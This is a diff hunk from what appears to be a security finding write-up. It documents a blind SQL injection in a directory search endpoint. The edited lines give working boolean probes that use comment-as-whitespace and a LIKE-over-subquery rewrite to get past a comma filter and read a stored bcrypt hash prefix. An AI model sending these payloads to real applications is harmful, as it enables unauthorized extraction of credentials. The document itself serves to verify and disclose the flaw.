@@ -176,13 +176,15 @@ the application never created.
    ```
    GET /directory?q=%'/**/AND/**/1=1#      -> every persona row
    GET /directory?q=%'/**/AND/**/1=2#      -> no rows
-   GET /directory?q=%'/**/AND/**/SUBSTRING((SELECT/**/password_hash/**/FROM/**/users
-       /**/WHERE/**/username='outsider_olly'),1,4)='$2b$'#      -> every persona row
-   GET /directory?q=<same probe with '0000' instead of '$2b$'>  -> no rows
+   GET /directory?q=%'/**/AND/**/(SELECT/**/password_hash/**/FROM/**/users/**/WHERE
+       /**/username='outsider_olly')/**/LIKE/**/'$2b%'#           -> every persona row
+   GET /directory?q=<same probe with '0000%' instead of '$2b%'>   -> no rows
    ```
 
-   The probe pair reads four characters of a stored bcrypt hash for an account the
+   The probe pair establishes the prefix of a stored bcrypt hash for an account the
    listing never exposes as a column, and the pair — not one request — is the proof.
+   It is written with `LIKE` over a scalar subquery rather than `SUBSTRING(x,1,4)`
+   because the function's argument separators are commas, and a comma ends a token.
 7. Assert the guard still works: an anonymous `GET /admin/users?q=<payload>` is a
    `303` to `/login`, so the injection needs a session and the finding is not also
    an access-control break.
